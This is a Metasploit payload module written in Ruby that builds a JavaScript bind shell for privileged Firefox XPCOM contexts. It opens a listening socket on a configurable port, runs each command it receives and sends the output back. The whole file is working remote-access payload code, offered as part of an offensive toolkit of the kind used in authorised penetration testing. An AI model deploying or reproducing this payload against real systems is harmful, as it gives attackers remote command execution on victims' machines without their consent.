##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/firefox'
require 'msf/base/sessions/command_shell'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Firefox
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Command Shell, Bind TCP (via Firefox XPCOM script)',
      'Description'   => 'Creates an interactive shell via Javascript with access to Firefox\'s XPCOM API',
      'Author'        => ['joev'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'firefox',
      'Arch'          => ARCH_FIREFOX,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'firefox',
      'Payload'       => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the JS string to use for execution
  #
  def command_string
    %Q|
    (function(){
      Components.utils.import("resource://gre/modules/NetUtil.jsm");
      var lport = #{datastore["LPORT"]};
      var rhost = "#{datastore['RHOST']}";
      var serverSocket = Components.classes["@mozilla.org/network/server-socket;1"]
                             .createInstance(Components.interfaces.nsIServerSocket);
      serverSocket.init(lport, false, -1);

      var listener = {
        onSocketAccepted: function(serverSocket, clientSocket) {
          var outStream = clientSocket.openOutputStream(0, 0, 0);
          var inStream = clientSocket.openInputStream(0, 0, 0);
          var pump = Components.classes["@mozilla.org/network/input-stream-pump;1"]
                     .createInstance(Components.interfaces.nsIInputStreamPump);
          pump.init(inStream, -1, -1, 0, 0, true);
          pump.asyncRead(clientListener(outStream), null);
        }
      };

      var clientListener = function(outStream) {
        return {
          onStartRequest: function(request, context) {},
          onStopRequest: function(request, context) {},
          onDataAvailable: function(request, context, stream, offset, count) {
            var data = NetUtil.readInputStreamToString(stream, count).trim();
            runCmd(data, function(err, output) {
              if(!err) outStream.write(output, output.length);
            });
          }
        };
      };

      #{run_cmd_source}

      serverSocket.asyncListen(listener);
    })();
    |
  end
end
